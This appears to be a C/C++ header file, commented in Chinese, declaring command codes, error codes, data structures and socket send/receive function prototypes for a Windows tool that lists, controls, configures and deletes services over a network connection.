/*
*	公共变量,函数定义
*/
#pragma once
#include <winsock2.h>
#include "resource.h"

//私有定义
#define WM_USERRCLICKSERVICES	WM_USER + 914		//服务列表右击
#define WM_SETMYCURSOR			WM_USER + 902		//光标控制

//公共定义

#define TRAN_DATA_LEN			2048 * 1024			//数据交换长度

#define CLIENT_ENUM_SERVICES	5019				//列举服务
#define CLIENT_CONTROL_SERVICES	5020				//控制服务
#define CLIENT_CONFIG_SERVICES	5021				//更新服务属性
#define CLIENT_DELETE_SERVICE	5023				//删除服务

#define NOT_FIND_ANY_FILE		7000				//找不到任何文件
#define GET_PROCESS_LIST_ERR	7006				//取进程列表失败
#define ENUM_SERVICES_FAIL		7012				//取服务列表失败
#define CONTROL_SERVICES_FAIL	7013				//控制服务失败
#define CONFIG_SERVICES_FAIL	7014				//更新服务状态失败
#define SERVICE_DELETE_ERR		7020				//删除服务失败

#define TRANS_DATA_ERR			8000				//通信错误

#define CONN_FILE_SERV_SEND		4011				//服务管理发送管道
#define CONN_FILE_SERV_RECV		4012				//服务管理接收管道

typedef struct _MYSERVICES_
{
	char m_Name[260];
	char m_Disp[260];
	char m_Status[20];
	DWORD dwServiceType; 
	DWORD dwStartType; 
	DWORD dwErrorControl; 
	char lpBinaryPathName[256]; 
	char lpLoadOrderGroup[256]; 
	DWORD dwTagId; 
	char lpDependencies[512]; 
	char lpServiceStartName[256]; 
	char lpDisplayName[256]; 
	char lpDescribe[256];
	char lpPassword [256];
}MYSERVICES,*LPMYSERVICES;


typedef struct _CLIENTDATA_
{
	char*	m_TransData;
	DWORD	m_TransLen;
	HANDLE  m_WorkEvent;
	UINT	m_Command;
	HANDLE	m_ThreadHandle;
	SOCKET	m_SendSocket;
	SOCKET	m_RecvSocket;
	HWND	hParent;
	BOOL	m_IsWork;
}CLIENTDATA,*LPCLIENTDATA;

void TransBagThread(LPVOID lPvoid);
BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
BOOL ProcessOneTrans(LPCLIENTDATA pData);
BOOL SendBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ReadBag(SOCKET s,char *Data,DWORD &len,UINT &command);
void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);
